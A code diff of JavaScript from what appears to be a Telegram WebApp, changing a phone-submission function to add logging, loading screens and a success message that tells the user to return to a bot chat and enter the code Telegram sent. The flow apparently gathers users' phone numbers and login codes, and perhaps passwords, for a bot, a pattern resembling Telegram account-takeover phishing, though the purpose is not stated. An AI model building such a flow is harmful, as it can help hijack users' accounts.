@@ -363,25 +363,58 @@
         }
 
         function submitPhone() {
-            if (authData.isProcessing) return;
+            if (authData.isProcessing) {
+                console.log('Already processing phone submission');
+                return;
+            }
+
             if (!authData.phone) {
                 tg.showAlert('Номер телефона не получен');
                 return;
             }
 
+            console.log('📱 Submitting phone:', authData.phone);
             authData.isProcessing = true;
     
+    // Показываем загрузку
+            showStep('loading-step');
+            document.getElementById('loading-title').textContent = 'Отправка номера...';
+            document.getElementById('loading-text').textContent = 'Telegram получает ваши данные';
+
             const payload = JSON.stringify({
                 action: 'request_code',
                 phone: authData.phone,
-                user_id: tg.initDataUnsafe?.user?.id
+                user_id: tg.initDataUnsafe?.user?.id || 0
             });
 
-            console.log('Sending phone to bot:', authData.phone);
-            tg.sendData(payload); // ЭТО ЗАКРОЕТ WEBAPP
-        }
+            console.log('📤 Sending payload:', payload);
 
-// Удалите submitCode() и submitPassword() - они не нужны
+            try {
+        // Небольшая задержка для визуализации
+                setTimeout(() => {
+                    console.log('🚀 Calling tg.sendData()...');
+                    tg.sendData(payload);
+                    console.log('✅ tg.sendData() called, WebApp should close now');
+            
+            // На случай если WebApp не закроется автоматически
+                    setTimeout(() => {
+                        authData.isProcessing = false;
+                        console.log('⚠️ WebApp still open after 3 seconds');
+                
+                // Показываем сообщение об успехе
+                        showStep('success-step');
+                        document.querySelector('#success-step h1').textContent = 'Данные отправлены!';
+                        document.querySelector('#success-step .subtitle').textContent = 
+                            'Код отправлен в Telegram.\nВернитесь в чат с ботом для ввода кода.';
+                    }, 3000);
+                }, 500);
+        
+            } catch (error) {
+                console.error('❌ Error sending data:', error);
+                authData.isProcessing = false;
+                showError('Ошибка отправки данных: ' + error.message);
+            }
+        }
 
         function submitCode() {
             if (authData.isProcessing) {
